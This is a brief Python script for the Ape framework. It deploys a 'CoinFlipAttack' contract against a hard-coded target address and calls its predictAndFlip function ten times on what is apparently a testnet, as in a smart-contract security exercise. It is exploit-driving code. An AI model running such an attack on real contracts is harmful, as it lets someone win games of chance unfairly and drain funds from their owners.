from ape import accounts, project
import time

def main():

    admin = accounts.load("mm2") # Use wallet which has testnet ether in it.

    contract = project.CoinFlipAttack.deploy(0x0ed1ea33f4fA8B50992aE1d5F0cf876A0ac76fCd,sender=admin)

    i = 0

    while i < 10:

        tx = contract.predictAndFlip(sender=admin)
        print(f"[{i}] TX Hash: {tx.txn_hash}")
        i += 1
        time.sleep(30)


    
